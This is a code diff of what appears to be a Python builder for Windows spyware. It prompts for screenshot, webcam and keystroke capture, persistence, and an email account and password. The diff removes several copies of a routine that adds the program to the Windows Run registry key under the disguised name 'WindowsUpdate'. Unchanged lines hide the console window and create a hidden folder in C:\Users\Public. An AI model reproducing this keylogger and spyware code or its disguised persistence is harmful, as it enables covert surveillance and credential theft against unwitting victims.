@@ -2,6 +2,8 @@ from colorama import Fore
 import os
 import shutil
 
+os.system("color")
+
 def options():
     global send_screens, send_webcam, send_keystrokes, persistence, agreement, email1, password, interval
     send_screens = input(Fore.YELLOW+"Send screenshots [y/n]: "+Fore.WHITE).lower()
@@ -119,15 +121,6 @@ import threading
 from winreg import *
 import ctypes
 from os import path
-   
-PathFile = path.abspath((__file__)[:-2]+'exe')
-print(PathFile)
-
-StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
-SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
-CloseKey(StartupKey)
-
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
 directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
 ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)
@@ -223,13 +216,6 @@ from datetime import datetime
 import keyboard
 import ctypes
 from os import path
-   
-PathFile = path.abspath((__file__)[:-2]+'exe')
-print(PathFile)
-
-StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
-SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
-CloseKey(StartupKey)
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -300,13 +286,6 @@ from winreg import *
 from multiprocessing import Process
 import ctypes
 from os import path
-   
-PathFile = path.abspath((__file__)[:-2]+'exe')
-print(PathFile)
-
-StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
-SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
-CloseKey(StartupKey)
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -427,13 +406,6 @@ from winreg import *
 from multiprocessing import Process
 import ctypes
 from os import path
-   
-PathFile = path.abspath((__file__)[:-2]+'exe')
-print(PathFile)
-
-StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
-SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
-CloseKey(StartupKey)
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -577,13 +549,6 @@ import threading
 from winreg import *
 import ctypes
 from os import path
-   
-PathFile = path.abspath((__file__)[:-2]+'exe')
-print(PathFile)
-
-StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
-SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
-CloseKey(StartupKey)
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -650,13 +615,6 @@ from multiprocessing import Process
 import ctypes
 from datetime import datetime
 from os import path
-   
-PathFile = path.abspath((__file__)[:-2]+'exe')
-print(PathFile)
-
-StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
-SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
-CloseKey(StartupKey)
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -764,13 +722,6 @@ import threading
 from winreg import *
 import ctypes
 from os import path
-   
-PathFile = path.abspath((__file__)[:-2]+'exe')
-print(PathFile)
-
-StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
-SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
-CloseKey(StartupKey)
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
